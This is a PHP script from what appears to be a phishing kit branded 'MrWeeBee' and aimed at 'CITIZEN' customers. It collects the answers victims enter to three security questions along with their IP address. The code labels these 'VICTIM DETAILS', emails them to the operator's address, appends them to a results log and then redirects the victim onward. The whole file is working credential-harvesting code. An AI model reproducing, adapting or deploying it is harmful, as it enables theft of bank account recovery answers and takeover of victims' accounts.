<?php

$settings = include '../../../settings/settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}



if(empty($_POST['rans1']) || !isset($_POST['rans1'])){
    echo "<script>window.location.href = \"../question.php\"; </script>";
       setcookie("logged_in", "0");
} else {
       setcookie("logged_in", "1");
}

if(empty($_POST['rans2']) || !isset($_POST['rans2'])){
  echo "<script>window.location.href = \"../question.php\"; </script>";
       setcookie("logged_in", "0");
} else {
       setcookie("logged_in", "1");
}

if(empty($_POST['rans3']) || !isset($_POST['rans3'])){
  echo "<script>window.location.href = \"../question.php\"; </script>";
       setcookie("logged_in", "0");
} else {
       setcookie("logged_in", "1");
}



# Allow URL Open

ini_set('allow_url_fopen',1);




function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();



# Settings

$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");

$question1 = $_POST['rquest1'];
$question2 = $_POST['rquest2'];
$question3 = $_POST['rquest3'];
$answer1 = $_POST['rans1'];
$answer2 = $_POST['rans2'];
$answer3 = $_POST['rans3'];

# Messsage

$message = "[ 💚 CITIZEN  | CLIENT : {$client} 💚 ]\n\n";
$message .= "********** [ REQUESTIONS & ANSWERS ] **********\n\n";
$message .= "********** [ QUESTION 1️ ] **********\n";
$message .= "# QUESTION   : {$question1}\n";
$message .= "# ANSWER     : {$answer1}\n";
$message .= "********** [ QUESTION 2️ ] **********\n";
$message .= "# QUESTION   : {$question2}\n";
$message .= "# ANSWER     : {$answer2}\n";
$message .= "********** [ QUESTION 3️ ] **********\n";
$message .= "# QUESTION   : {$question3}\n";
$message .= "# ANSWER     : {$answer3}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
       $to = $settings['email'];
       $headers = "Content-type:text/plain;charset=UTF-8\r\n";
       $headers .= "From: MrWeeBee <citizen@client_{$client}_site.com>" . "\r\n";
       $subject = "🔰MRWEEBEE🔰CITIZEN🔰REQUESTIONS🔰CLIENT #{$client}🔰{$IP}";
       $msg = $message;
       mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
       $results = fopen($filename, "a+");
       fwrite($results, $message);
       fclose($results);
}




       echo "<script>window.location.href = \"../account\";</script>";


?>
